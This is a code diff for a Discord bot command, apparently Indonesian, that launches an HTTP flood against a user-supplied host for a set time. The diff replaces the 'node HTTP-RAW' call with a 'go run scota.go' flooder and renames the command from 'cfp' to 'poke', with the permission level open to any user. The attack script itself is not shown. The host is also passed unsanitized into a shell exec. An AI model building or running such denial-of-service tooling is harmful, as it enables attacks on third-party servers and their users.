@@ -32,7 +32,7 @@ if(!args[0]) {
 	const embed1 = new Discord.MessageEmbed()
 	.setColor('RANDOM')
 	.setTitle('WARRING')
-	.setDescription("`contoh ;http target time api`")
+	.setDescription("`contoh ;poke target time api`")
 	.setFooter("GUNAKAN DENGAN BIJAK OKH!!!")
 	message.channel.send(embed1);
 	return;
@@ -72,7 +72,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`node HTTP-RAW ${host} ${time}`, (error, stdout, stderr) => {
+exec(`go run scota.go --host ${host} --time ${time}s`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
@@ -117,12 +117,12 @@ const embed = new Discord.MessageEmbed()
 exports.conf = {
   enabled: true,
   guildOnly: false,
-  aliases: ['cfp'],
+  aliases: ['poke'],
   permLevel: 0
 }
 
 exports.help = {
-  name: 'cfp',
+  name: 'poke',
   description: 'YUKAI',
-  usage: 'cfp'
+  usage: 'poke'
 }
